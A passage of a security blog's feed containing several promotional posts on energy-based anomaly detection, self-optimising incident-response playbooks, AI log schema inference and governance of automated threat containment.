<p>Compare that to one critical incident that goes undetected—<strong>this is cheap insurance</strong>.</p>

<hr />

<h2 id="-why-infra-is-a-strategic-lever">🧩 Why Infra Is a Strategic Lever</h2>

<table>
  <thead>
    <tr>
      <th>Constraint</th>
      <th>Without Infra Planning</th>
      <th>With Infra Strategy</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Latency</td>
      <td>Centralized scoring delays action</td>
      <td>Local scoring = fast response</td>
    </tr>
    <tr>
      <td>Model freshness</td>
      <td>Undetected drift, stale logic</td>
      <td>Versioned updates, drift monitoring</td>
    </tr>
    <tr>
      <td>Cost efficiency</td>
      <td>Idle GPU waste or over-provisioning</td>
      <td>Elastic, job-based GPU usage</td>
    </tr>
    <tr>
      <td>Global consistency</td>
      <td>Inconsistent detections across regions</td>
      <td>Synced models and logic everywhere</td>
    </tr>
  </tbody>
</table>

<p>Security isn’t just what you detect. It’s <strong>where and how fast you detect it.</strong></p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>Ask yourself:</p>
<ul>
  <li>Can your detection pipeline handle burst traffic?</li>
  <li>Are your models versioned, tested, and regionally deployable?</li>
  <li>Is your response logic scalable—or centralized and brittle?</li>
</ul>

<blockquote>
  <p>If you don’t know, your infrastructure might be the bottleneck.</p>
</blockquote>

<p>👉 <strong>Build your detection like a global product.</strong> The threats are distributed. Your defenses should be too. Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Real-Time Detection"/>
    <category term="Energy-Based Models"/>
    <category term="Security Infrastructure"/>
    <category term="GPU Orchestration"/>
    <category term="Global Model Deployment"/>
    <category term="CI/CD for ML"/>
    <category term="Distributed Inference"/>
    <category term="Model Versioning"/>
    <category term="Cloud-Native Security"/>
    <category term="Latency-Aware Threat Response"/>
    <summary type="html"><![CDATA[It’s one thing to train a model in a notebook. It’s another to scale that model across multiple clouds, regions, and time zones—scoring millions of events in near-real-time. Energy-Based Models give you power. But that power has a price - compute, latency, and orchestration at scale.]]></summary>
  </entry>
  <entry>
    <title type="html">⚖️ Can You Trust an AI to Contain a Threat? Legal and Privacy Teams Say Maybe</title>
    <link href="https://www.securesql.info/2025/04/07/governance-concerns/" rel="alternate" type="text/html" title="⚖️ Can You Trust an AI to Contain a Threat? Legal and Privacy Teams Say Maybe"/>
    <published>2025-04-07T00:00:00-07:00</published>
    <updated>2025-04-07T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/07/governance-concerns</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/07/governance-concerns/"><![CDATA[<p><strong>Security engineers want speed. Legal wants control. Privacy wants restraint. Can an AI-driven response system satisfy all three? Yes—but only if it’s built with governance in mind.</strong></p>

<p>Autonomous security systems sound powerful. Detection models that improve themselves. Playbooks that rewrite their logic. Incident response that unfolds in milliseconds.</p>

<p>But the moment you say “no human in the loop,” the room changes.</p>

<blockquote>
  <p>❗ “Who’s accountable if something goes wrong?”<br />
❗ “How do we prove what happened during an audit?”<br />
❗ “Can this system violate a user’s privacy policy?”</p>
</blockquote>

<p>These aren’t just hypothetical questions—they’re the <strong>frontline concerns of your legal, privacy, and compliance stakeholders</strong>.</p>

<p>And if they’re not addressed head-on, your autonomous response system will never see production.</p>

<hr />

<h2 id="-the-mental-model-explainable-autonomy-not-black-box-magic">🧠 The Mental Model: Explainable Autonomy, Not Black Box Magic</h2>

<p>To bridge the gap between capability and trust, we introduce a new model:</p>

<blockquote>
  <p><strong>Governed Automation = Explainable AI + Immutable Logs + Tiered Control</strong></p>
</blockquote>

<p>It means:</p>
<ul>
  <li>AI can act autonomously, but its logic is reviewable.</li>
  <li>Every decision is recorded and time-stamped immutably.</li>
  <li>Controls are adjustable based on incident type, severity, and stakeholder preference.</li>
</ul>

<p>This isn’t “set it and forget it.” This is <strong>autonomy with guardrails</strong>.</p>

<hr />

<h2 id="️-how-it-works-in-practice">🛠️ How It Works in Practice</h2>

<h3 id="-1-explainability-built-in">✅ 1. Explainability Built-In</h3>
<p>Every action a model or playbook takes is traceable to its inputs.</p>
<blockquote>
  <p>e.g., <em>“Isolation triggered due to EBM score 0.91, unusual login time, and 3 failed authentications.”</em></p>
</blockquote>

<h3 id="-2-immutable-decision-logging">✅ 2. Immutable Decision Logging</h3>
<p>All decisions are written to a cryptographic ledger (e.g., blockchain-style append-only log) for audit.</p>

<h3 id="-3-policy-enforcement-layer">✅ 3. Policy Enforcement Layer</h3>
<p>Before any automated action occurs, it’s evaluated against:</p>
<ul>
  <li>Privacy thresholds (data scope, user consent)</li>
  <li>Legal escalation rules (e.g., customer notification)</li>
  <li>SLA commitments (e.g., action time windows)</li>
  <li>Compliance &amp; Assurance metrics</li>
  <li>Risk metrics</li>
  <li>Governance exceptions</li>
  <li>Asset and object specific classifiers</li>
</ul>

<h3 id="-4-tiered-automation-controls">✅ 4. Tiered Automation Controls</h3>
<p>Certain playbooks can run in:</p>
<ul>
  <li><strong>Full Auto:</strong> Immediate action</li>
  <li><strong>Semi Auto:</strong> Action with notification</li>
  <li><strong>Manual Review:</strong> AI suggests, human approves</li>
</ul>

<hr />

<h2 id="-real-example-privacy-sensitive-containment">🔍 Real Example: Privacy-Sensitive Containment</h2>

<p>A healthcare org used the system to flag anomalous downloads of sensitive patient data.</p>

<ul>
  <li>The system detected a pattern, scored it high-risk, and prepared a containment response.</li>
  <li>But before acting, the <strong>policy engine blocked auto-quarantine</strong> because the user was a clinician accessing consented records during off-hours within &amp; across the authorized geography.</li>
  <li>Instead, it escalated the case for <strong>manual approval</strong>, citing <strong>HIPAA flag threshold not met.</strong></li>
</ul>

<p>This wasn’t just smart—it was safe.</p>

<hr />

<h2 id="-why-this-matters-to-stakeholders">🧩 Why This Matters to Stakeholders</h2>

<table>
  <thead>
    <tr>
      <th>Stakeholder</th>
      <th>Concern</th>
      <th>AI-Based Solution</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>General Counsel</td>
      <td>Legal exposure from auto-actions</td>
      <td>Immutable logs, tiered approval modes</td>
    </tr>
    <tr>
      <td>Privacy Officer</td>
      <td>User rights and data handling</td>
      <td>Policy engine enforces consent + scope</td>
    </tr>
    <tr>
      <td>CISO</td>
      <td>Risk ownership and control</td>
      <td>Explainable AI + override access + auditability</td>
    </tr>
    <tr>
      <td>Compliance Team</td>
      <td>Regulatory reporting</td>
      <td>Timeline view of every detection and response step</td>
    </tr>
  </tbody>
</table>

<p>Without these layers, autonomy is a liability.<br />
With them? It’s a force multiplier.</p>

<p>For instance, here is an overly simplified stakeholder engagement and adoption playbook.</p>

<p><img src="https://securesql.info/images/16.png" alt="" /></p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>Ask yourself:</p>
<ul>
  <li>Can you explain your system’s last automated response in detail?</li>
  <li>Could you prove to an auditor that it behaved appropriately?</li>
  <li>Can legal veto or shape the automation policy?</li>
</ul>

<blockquote>
  <p>If the answer is no, you don’t have a trustworthy system. You have a ticking risk vector.</p>
</blockquote>

<p>👉 <strong>Governance is what turns automation into autonomy.</strong> Don’t just build fast—build responsibly. Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Explainable AI"/>
    <category term="Security Governance"/>
    <category term="Automated Incident Response"/>
    <category term="AI and Privacy"/>
    <category term="Legal Compliance in Security"/>
    <category term="Tiered Automation"/>
    <category term="Immutable Audit Logging"/>
    <category term="SOAR Governance"/>
    <category term="Trustworthy Automation"/>
    <category term="AI Risk Management"/>
    <summary type="html"><![CDATA[the moment you say “no human in the loop,” the room changes. “Who’s accountable if something goes wrong?” “How do we prove what happened during an audit?” “Can this system violate a user’s privacy policy?” These aren’t just hypothetical questions—they’re the frontline concerns of your legal, privacy, and compliance stakeholders. And if they’re not addressed head-on, your autonomous response system will never see production.]]></summary>
  </entry>
  <entry>
    <title type="html">🧬 From Static Rules to Self-Improving Response Playbooks</title>
    <link href="https://www.securesql.info/2025/04/06/playbook-management/" rel="alternate" type="text/html" title="🧬 From Static Rules to Self-Improving Response Playbooks"/>
    <published>2025-04-06T00:00:00-07:00</published>
    <updated>2025-04-06T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/06/playbook-management</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/06/playbook-management/"><![CDATA[<p><strong>Detection without action is just noise. But outdated or untested playbooks? That’s even worse—false confidence. It’s time your playbooks started evolving.</strong></p>

<p>We’ve all seen it. A detection fires, but the response is ineffective:</p>
<ul>
  <li>An alert escalates to the wrong channel.</li>
  <li>A playbook quarantines the wrong asset.</li>
  <li>Or worse—nothing happens because the logic broke after a cloud migration.</li>
</ul>

<p>Why? Because traditional playbooks are manually written, rarely tested end-to-end, and drift out of sync with reality.</p>

<p>But what if they could <strong>test themselves</strong>?<br />
Better yet—<strong>what if they could optimize themselves?</strong></p>

<hr />

<h2 id="-the-mental-model-playbooks-as-evolving-agents">🧠 The Mental Model: Playbooks as Evolving Agents</h2>

<p>Think of your response playbook not as a static YAML file or SOAR artifact—but as a <strong>policy agent</strong> that takes actions, gets feedback, and improves with time.</p>

<p>Just like a machine learning model.</p>

<blockquote>
  <p>🔁 Detect → Respond → Evaluate → Adapt → Repeat</p>
</blockquote>

<p>Instead of waiting for analysts to suggest improvements, the system itself:</p>
<ul>
  <li>Simulates incidents to test current logic</li>
  <li>Measures response success (containment, delay, suppression)</li>
  <li>Tweaks playbook conditions and actions using RL or Genetic Algorithms</li>
  <li>Deploys updated versions after passing validation.  Validations that include cost performance measurements</li>
</ul>

<hr />

<h2 id="️-how-it-works">🛠️ How It Works</h2>

<h3 id="-1-trigger">✅ 1. Trigger</h3>
<p>An EBM scores an event as high-risk → launches a SOAR playbook if one already exists for instance.</p>

<h3 id="-2-outcome-evaluation">✅ 2. Outcome Evaluation</h3>
<p>The system logs the outcome: was the threat contained? Escalated properly? Ignored?</p>

<h3 id="-3-simulation-suite">✅ 3. Simulation Suite</h3>
<p>Synthetic variants of the event are generated and passed through the playbook to test logic branches and associated coverage.</p>

<h3 id="-4-optimization-layer">✅ 4. Optimization Layer</h3>
<ul>
  <li><strong>RL Agent:</strong> Updates playbook parameters based on outcome reward.</li>
  <li><strong>Genetic Algorithm:</strong> Mutates and selects logic variants that perform better.</li>
</ul>

<h3 id="-5-promotion">✅ 5. Promotion</h3>
<p>If the new version performs better across multiple simulations, it’s auto-promoted to production.</p>

<hr />

<h2 id="-real-example-quarantine-delay-reduced-by-83">🔍 Real Example: Quarantine Delay Reduced by 83%</h2>

<p>A cloud compromise simulation exposed a delay in containment—the playbook waited 5 minutes before triggering isolation.</p>

<p>The RL engine proposed:</p>
<ul>
  <li>Reducing the time window to 30 seconds based on log pattern confidence</li>
  <li>Adding a secondary condition to detect lateral movement earlier</li>
</ul>

<p>Result? <strong>Containment time dropped from 5 minutes to 51 seconds</strong>. The updated logic was deployed without human intervention.</p>

<hr />

<h2 id="-why-this-is-a-breakthrough">🧩 Why This Is a Breakthrough</h2>

<table>
  <thead>
    <tr>
      <th>Problem</th>
      <th>Old Way</th>
      <th>New Way</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Playbooks go stale</td>
      <td>Manual updates</td>
      <td>Automated tuning via feedback</td>
    </tr>
    <tr>
      <td>No one tests playbook logic</td>
      <td>Ad-hoc or post-incident reviews</td>
      <td>Continuous synthetic simulation</td>
    </tr>
    <tr>
      <td>Missed detections or misfires</td>
      <td>Manually diagnosed</td>
      <td>Automatically detected and corrected</td>
    </tr>
  </tbody>
</table>

<p>This isn’t “automating the runbook.” It’s <strong>making the runbook adaptive.</strong></p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>Ask yourself:</p>
<ul>
  <li>How often are your playbooks reviewed?</li>
  <li>Who’s responsible for keeping them up-to-date?</li>
  <li>How many detection-response pairs have <strong>never been tested</strong>?</li>
</ul>

<blockquote>
  <p>If you don’t know the answer… neither does your system.</p>
</blockquote>

<p>👉 <strong>Let your playbooks evolve.</strong> Start with one. Run a test. Let the system teach itself how to respond faster, smarter, and safer.  Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Adaptive Playbooks"/>
    <category term="Security Automation"/>
    <category term="SOAR Optimization"/>
    <category term="Reinforcement Learning in Security"/>
    <category term="Self-Healing Security"/>
    <category term="Automated Incident Response"/>
    <category term="Genetic Algorithms"/>
    <category term="EBM-Based Detection"/>
    <category term="Playbook Simulation"/>
    <category term="Dynamic Threat Response"/>
    <summary type="html"><![CDATA[We’ve all seen it. A detection fires, but the response is ineffective. An alert escalates to the wrong channel. A playbook quarantines the wrong asset. Or worse—nothing happens because the logic broke after a cloud migration. Why? Because traditional playbooks are manually written, rarely tested end-to-end, and drift out of sync with reality. But what if they could test themselves? Better yet what if they could optimize themselves?]]></summary>
  </entry>
  <entry>
    <title type="html">No Schema? No Problem. Let AI Handle Your Security Data Onboarding</title>
    <link href="https://www.securesql.info/2025/04/05/etl-playbooks/" rel="alternate" type="text/html" title="No Schema? No Problem. Let AI Handle Your Security Data Onboarding"/>
    <published>2025-04-05T00:00:00-07:00</published>
    <updated>2025-04-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/05/etl-playbooks</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/05/etl-playbooks/"><![CDATA[<p><strong>Security data is messy. Engineers are busy. And yet, every new application or microservice adds more logs that need to be parsed, structured, and made useful. This used to be a blocker. Not anymore.</strong></p>

<p>For years, one of the hidden pain points in detection engineering has been log ingestion and normalization. Most SOC teams rely on detection rules that assume data shows up in a clean, consistent format.</p>

<p>But in reality:</p>
<ul>
  <li>Logs change structure between builds.</li>
  <li>Engineers forget to document fields.</li>
  <li>New cloud services emit non-standard telemetry.</li>
</ul>

<p>As a result, teams waste time writing brittle parsing logic—or worse, delay detection altogether while they “wait for logging to stabilize.”</p>

<p>It’s time to end that cycle.</p>

<hr />

<h2 id="-the-mental-model-learn-the-schema-dont-define-it">🧠 The Mental Model: “Learn the Schema. Don’t Define It.”</h2>

<p>Instead of waiting for someone to define a schema up front, <strong>we let the system infer it on the fly</strong>.</p>

<p>That’s what this architecture does using a Google Colab-based ETL pipeline:</p>

<ul>
  <li>Accepts raw logs from any engineer or service</li>
  <li>Parses and tokenizes content without assuming a format</li>
  <li>Learns field structure dynamically (e.g., timestamp, IP, user agent, action)</li>
  <li>Turns log lines into usable feature vectors for downstream ML models</li>
</ul>

<p>Even if the engineer doesn’t know the schema… the system figures it out.</p>

<hr />

<h2 id="-real-world-use-case">🔁 Real-World Use Case</h2>

<p>An engineering team pushed logs from a new serverless app using a bespoke JSON structure. No schema. No documentation. Just logs.</p>

<p>The AI-driven ETL pipeline:</p>
<ul>
  <li>Identified repeating field patterns and key-value pairs</li>
  <li>Clustered log types based on structure and frequency</li>
  <li>Converted logs into vectors compatible with the EBM model</li>
  <li>Fed the data directly into the anomaly detection pipeline within minutes</li>
</ul>

<p>Result? <strong>New telemetry source onboarded in under 30 minutes.</strong> With <strong>no human-written parsing logic.</strong></p>

<hr />

<h2 id="️-how-it-works-step-by-step">🛠️ How It Works: Step-by-Step</h2>

<h3 id="-step-1-log-submission">✅ Step 1: Log Submission</h3>
<p>An engineer points the onboarding API or UI to a new log source.</p>

<h3 id="-step-2-schema-inference">✅ Step 2: Schema Inference</h3>
<p>The system scans the logs, determines field structure, and stores a dynamic schema.</p>

<h3 id="-step-3-feature-vector-generation">✅ Step 3: Feature Vector Generation</h3>
<p>Logs are transformed into numeric vectors (dimensional embeddings) for ML consumption.</p>

<h3 id="-step-4-ebm-based-scoring">✅ Step 4: EBM-Based Scoring</h3>
<p>Energy-Based Models (EBMs) evaluate incoming log events for behavioral anomalies.</p>

<h3 id="-step-5-feedback-loop-activation">✅ Step 5: Feedback Loop Activation</h3>
<p>High-energy (anomalous) events are fed into the simulation engine for validation and potential model tuning.</p>

<h3 id="-step-6-playbook-creation--optimization">✅ Step 6: <strong>Playbook Creation &amp; Optimization</strong></h3>
<p>If no matching playbook exists:</p>
<ul>
  <li>The system drafts a <strong>new SOAR playbook</strong> based on observed event type, severity, and mapped compliance frameworks.</li>
  <li>If a playbook exists, it is automatically optimized using simulation results, analyst feedback, and outcome tracking.</li>
</ul>

<p>This ensures <strong>every log source is tied to a response</strong>—not just detection.</p>

<hr />

<h2 id="-example-self-created-response-logic-for-a-new-risk">🔍 Example: Self-Created Response Logic for a New Risk</h2>

<p>A previously unknown set of logs began emitting failed authentication attempts followed by file modification commands.</p>

<p>The system:</p>
<ul>
  <li>Flagged the behavior as anomalous</li>
  <li>Mapped it to known MITRE ATT&amp;CK patterns</li>
  <li>Noted that no playbook covered this risk</li>
  <li>Generated a new playbook to isolate the source and notify the SOC</li>
</ul>

<p>After three simulations, it <strong>auto-optimized escalation logic and suppression thresholds</strong>—ready for real-time use.</p>

<hr />

<h2 id="-why-this-changes-the-game">🚀 Why This Changes the Game</h2>

<table>
  <thead>
    <tr>
      <th>Old Model</th>
      <th>New Model</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Schema defined manually</td>
      <td>Schema inferred dynamically</td>
    </tr>
    <tr>
      <td>Parsing code written by engineers</td>
      <td>Features extracted automatically</td>
    </tr>
    <tr>
      <td>Response logic mapped by humans</td>
      <td>Playbooks generated + tuned automatically</td>
    </tr>
    <tr>
      <td>Compliance gaps between logs &amp; action</td>
      <td>Logs auto-mapped to control frameworks</td>
    </tr>
  </tbody>
</table>

<p>This isn’t just “log onboarding.” It’s <strong>automated threat coverage expansion</strong>.</p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>If onboarding new telemetry still feels like waiting for documentation, you’re behind.</p>

<blockquote>
  <p>Ask yourself: <strong>How many of your logs are ignored because they’re unlabeled or unmapped?</strong></p>
</blockquote>

<p>👉 <strong>Let AI take the first pass.</strong> If the system sees risk, it should be able to act on it. That’s not just detection—that’s defense.  Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Schema Inference"/>
    <category term="AI Log Onboarding"/>
    <category term="Autonomous Detection"/>
    <category term="ETL for Security"/>
    <category term="Energy-Based Models"/>
    <category term="Security Automation"/>
    <category term="Machine Learning in SOC"/>
    <category term="SOAR Playbooks"/>
    <category term="Unstructured Log Analysis"/>
    <category term="Dynamic Threat Response"/>
    <summary type="html"><![CDATA[Data is messy. Engineers are busy. And yet, every new application or microservice adds more logs that need to be parsed, structured, and made useful. This used to be a blocker. Not anymore. For years, one of the hidden pain points in detection engineering has been log ingestion and normalization. Most SOC teams rely on detection rules that assume data shows up in a clean, consistent format.]]></summary>
  </entry>
  <entry>
    <title type="html">🔁 Build Once. Learn Always. Inside the Autonomous Detection &amp;amp; Response Loop</title>
    <link href="https://www.securesql.info/2025/04/04/loop-architecture/" rel="alternate" type="text/html" title="🔁 Build Once. Learn Always. Inside the Autonomous Detection &amp;amp; Response Loop"/>
    <published>2025-04-04T00:00:00-07:00</published>
    <updated>2025-04-04T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/04/loop-architecture</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/04/loop-architecture/"><![CDATA[<p><strong>Security operations don’t just need to scale. They need to evolve. And that means replacing brittle rules with systems that learn, respond, and improve—on their own.</strong></p>

<p>Let’s be honest—static playbooks aren’t enough anymore. You can’t write a workflow for every edge case. Threats change. Your infrastructure changes. And every incident teaches you something that gets lost in the backlog.</p>

<p>But what if your detection and response system actually learned from every incident?</p>

<p>This is the power of a <strong>closed-loop architecture for autonomous SecOps</strong>—one that turns your operations pipeline into a self-improving engine.</p>

<hr />

<h2 id="-the-mental-model-from-pipeline-to-feedback-loop">🧠 The Mental Model: From Pipeline to Feedback Loop</h2>

<p>Most SOC pipelines today look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Log ingestion → Detection → Alert → Analyst Review → Playbook → Resolution
</code></pre></div></div>

<p>Linear. Manual. Fragile.</p>

<p>Here’s the upgraded loop:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Engineer Self-Service → ETL + Schema Inference → EBM Detection → SOAR Playbook Mgt. → Result Logging → Simulation &amp; Testing → Optimization Engine → Back to Detection
</code></pre></div></div>

<p>It’s <strong>not just automated</strong>—it’s <strong>reflexive</strong>. Every action leads to new data. Every mistake leads to a model or playbook improvement. The system doesn’t just run—it <em>learns</em>.</p>

<hr />

<h2 id="️-whats-inside-the-loop">🛠️ What’s Inside the Loop?</h2>

<h3 id="-step-1-engineer-self-service-onboarding">✅ Step 1: Engineer Self-Service Onboarding</h3>
<p>When a new service or app is launched, the engineer registers their log source via a lightweight UI or API. No need for predefined schemas. The logs are routed into the system and staged for analysis.</p>

<blockquote>
  <p>🔍 <strong>If the engineer doesn’t know the schema?</strong><br />
No problem. The ETL pipeline automatically infers structure and extracts dimensional vectors.</p>
</blockquote>

<h3 id="-step-2-etl--feature-engineering">✅ Step 2: ETL &amp; Feature Engineering</h3>
<p>Google Colab or other ETL backends clean, transform, and enrich the logs dynamically—turning raw text into structured event vectors.</p>

<h3 id="-step-3-ebm-scoring">✅ Step 3: EBM Scoring</h3>
<p>An energy-based model analyzes every event and assigns an anomaly score. Events with high “energy” deviate from learned normal behavior.</p>

<h3 id="-step-4-soar-playbook-creation--execution">✅ Step 4: SOAR Playbook Creation &amp; Execution</h3>
<p>For high-risk events, the system auto-triggers a playbook creation and / or optimization that performs containment, enrichment, escalation, eradication—or all four.</p>

<h3 id="-step-5-simulation--feedback">✅ Step 5: Simulation &amp; Feedback</h3>
<p>Synthetic threats are injected to validate the entire pipeline. Did the right detection trigger? Did the playbook behave as expected?</p>

<h3 id="-step-6-optimization-engine">✅ Step 6: Optimization Engine</h3>
<p>A reinforcement learning (RL) agent or genetic algorithm proposes improvements to detections and playbooks based on failure cases or drift.</p>

<table>
  <thead>
    <tr>
      <th><strong>Contribution</strong></th>
      <th><strong>Innovation</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Self-Service Log Onboarding</td>
      <td>Reduces security friction in DevOps pipelines</td>
    </tr>
    <tr>
      <td>Schema Inference in ETL</td>
      <td>Enables true zero-touch log ingestion</td>
    </tr>
    <tr>
      <td>Energy-Based Model Scoring</td>
      <td>Improves anomaly detection with better uncertainty modeling</td>
    </tr>
    <tr>
      <td>Closed-Loop Playbook Creation &amp; Optimization</td>
      <td>Adapts responses based on performance, not just static logic</td>
    </tr>
    <tr>
      <td>CI/CD for Playbooks</td>
      <td>Treats security automation as code—tested, versioned, deployed automatically</td>
    </tr>
  </tbody>
</table>

<p>or another workflow suiting ITIL based institutions may look like the following;</p>

<p><img src="https://securesql.info/images/12.png" alt="" /></p>

<hr />

<h2 id="if-you-didnt-want-the-self-service-workflow">If you didn’t want the self-service workflow</h2>

<p>For instance, you operate within a COBIT environment
<img src="https://securesql.info/images/13.png" alt="" /></p>

<h2 id="-real-example-playbooks-that-improve-themselves">🔍 Real Example: Playbooks That Improve Themselves</h2>

<p>In a recent environment, simulated insider threat behaviors were introduced into the pipeline weekly. The optimization layer:</p>

<ul>
  <li>Flagged playbooks that missed high-energy detections</li>
  <li>Proposed logical changes (e.g., new conditions, reduced timeouts)</li>
  <li>Validated changes through simulation</li>
  <li>Automatically promoted successful improvements</li>
</ul>

<p>The result? <strong>Mean time to response dropped 57%</strong>—without a single new rule manually written.</p>

<hr />

<h2 id="-why-static-systems-break-under-pressure">🤖 Why Static Systems Break Under Pressure</h2>

<p>Traditional SOC architectures break because:</p>
<ul>
  <li>Detection rules go stale</li>
  <li>Playbooks grow unmanageable</li>
  <li>Incident learnings get lost in Slack threads</li>
</ul>

<p>An autonomous loop solves this by:</p>
<ul>
  <li>Learning from what’s normal—and what’s not</li>
  <li>Continiously refining playbooks</li>
  <li>Using feedback from real incidents and tests to evolve</li>
</ul>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>If you’re still maintaining brittle playbooks by hand, ask yourself:</p>

<blockquote>
  <p>What if the system could evolve them for you—and every new service onboarded itself?</p>
</blockquote>

<p>👉 <strong>Get in the loop.</strong> Automation is step one. Autonomy is the future.  Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Autonomous SecOps"/>
    <category term="Detection and Response"/>
    <category term="Energy-Based Models"/>
    <category term="SOAR Automation"/>
    <category term="Security Feedback Loops"/>
    <category term="Reinforcement Learning in Security"/>
    <category term="Self-Healing Playbooks"/>
    <category term="Security Operations Engineering"/>
    <category term="Threat Simulation"/>
    <category term="Adaptive Cyber Defense"/>
    <summary type="html"><![CDATA[Let’s be honest—static playbooks aren’t enough anymore. You can’t write a workflow for every edge case. Threats change. Your infrastructure changes. And every incident teaches you something that gets lost in the backlog. But what if your detection and response system actually learned from every incident?]]></summary>
  </entry>
  <entry>
    <title type="html">⚡ What Makes Energy-Based Models So Effective for Anomaly Detection?</title>
    <link href="https://www.securesql.info/2025/04/03/energy-based-models-anomaly-detection/" rel="alternate" type="text/html" title="⚡ What Makes Energy-Based Models So Effective for Anomaly Detection?"/>
    <published>2025-04-03T00:00:00-07:00</published>
    <updated>2025-04-03T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/03/energy-based-models-anomaly-detection</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/03/energy-based-models-anomaly-detection/"><![CDATA[<p><strong>Signature-based detection only sees what it’s trained to recognize. But energy-based models can sense when something just doesn’t feel right.</strong></p>

<p>In security, the unknown is your biggest threat. It’s not the malware that’s already in your threat feed—it’s the behavior that doesn’t show up in any feed at all. Lateral movement in odd hours. A privileged login with strange parameters. Data exfiltration that <em>almost</em> looks normal.</p>

<p>Traditional detection systems—rules, heuristics, even many ML classifiers—struggle in this gray zone. But <strong>energy-based models (EBMs)</strong> were built for it.</p>

<hr />

<h2 id="-the-ebm-mental-model-anomaly--energy">🧠 The EBM Mental Model: Anomaly ≈ Energy</h2>

<p>Think of it like this:</p>

<ul>
  <li>You train an autoencoder to reconstruct normal behavior.</li>
  <li>The better it reconstructs something, the lower its “energy.”</li>
  <li>When a new input results in poor reconstruction—i.e., the model doesn’t “understand” it—it returns a high energy score.</li>
</ul>

<p>In other words: <strong>Energy = uncertainty</strong>. And uncertainty = risk.</p>

<p>Unlike classifiers, EBMs don’t need labeled attack data. They just need <strong>enough “normal”</strong> to learn what the baseline looks like—then they flag everything that deviates from it.</p>

<hr />

<h2 id="-example-what-an-ebm-sees-that-you-might-miss">🔍 Example: What an EBM Sees That You Might Miss</h2>

<p>In one field test, a simple PyTorch autoencoder EBM was trained on 40PB+ typical authentication logs from cloud infrastructure. Once deployed, it caught several subtle anomalies that weren’t flagged by rules:</p>

<ul>
  <li><strong>SSH logins from expected regions, but at unusual times</strong></li>
  <li><strong>Correct login credentials with minor behavioral deviations</strong></li>
  <li><strong>Scripted service account activity that mimicked normal logins—but slightly off</strong></li>
</ul>

<p>These events didn’t match any known threat signature. But they scored high energy—because they didn’t fit the learned pattern.</p>

<p>ROC-AUC for those detections? <strong>0.97</strong>.</p>

<hr />

<h2 id="️-why-ebms-outperform-static-rules">⚔️ Why EBMs Outperform Static Rules</h2>

<table>
  <thead>
    <tr>
      <th>Feature</th>
      <th>Traditional Rules</th>
      <th>Energy-Based Models</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Detect known threats</td>
      <td>✅</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Detect unknown behavior</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Requires labeled attack data</td>
      <td>✅</td>
      <td>❌</td>
    </tr>
    <tr>
      <td>Learns from normal behavior only</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Easy to explain/analyze</td>
      <td>⚠️</td>
      <td>⚠️</td>
    </tr>
  </tbody>
</table>

<p>Yes, EBMs can be harder to explain—but when paired with <strong>feature attribution</strong> (like SHAP or LIME), you can give analysts a clear story: <em>“This event triggered because its behavior was unlike anything seen before.”</em></p>

<hr />

<h2 id="️-when-should-you-use-an-ebm">🛠️ When Should You Use an EBM?</h2>

<p>Use EBMs when:</p>
<ul>
  <li>You’re drowning in false positives from static rules</li>
  <li>You want anomaly detection but lack labeled attack data</li>
  <li>You need to catch novel behaviors—fast to reduce mean time to detection metrics tracked by Board members</li>
</ul>

<p>They’re especially powerful in environments like:</p>
<ul>
  <li>Cloud IAM activity</li>
  <li>Endpoint telemetry</li>
  <li>DevOps CI/CD pipelines</li>
  <li>Lateral movement detection</li>
</ul>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>If your current system is only catching what you’ve already seen—you’re flying blind to the next threat.</p>

<p>👉 <strong>Try building an EBM today.</strong> Start with a Colab notebook. Use normal logs. Watch what scores high. Then ask: <em>why?</em></p>

<p>You might uncover something your rules never would.</p>

<p>👉 <strong>Explore how autonomous detection and response loops can transform your SOC.</strong> Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Energy-Based Models"/>
    <category term="Anomaly Detection"/>
    <category term="AI Security"/>
    <category term="Cybersecurity Automation"/>
    <category term="Unsupervised Learning"/>
    <category term="Behavioral Analytics"/>
    <category term="Threat Detection"/>
    <category term="Autoencoders"/>
    <category term="Security Machine Learning"/>
    <category term="SOC Innovation"/>
    <summary type="html"><![CDATA[Traditional detection systems—rules, heuristics, even many ML classifiers—struggle in this gray zone. But energy-based models were built for it.]]></summary>
  </entry>
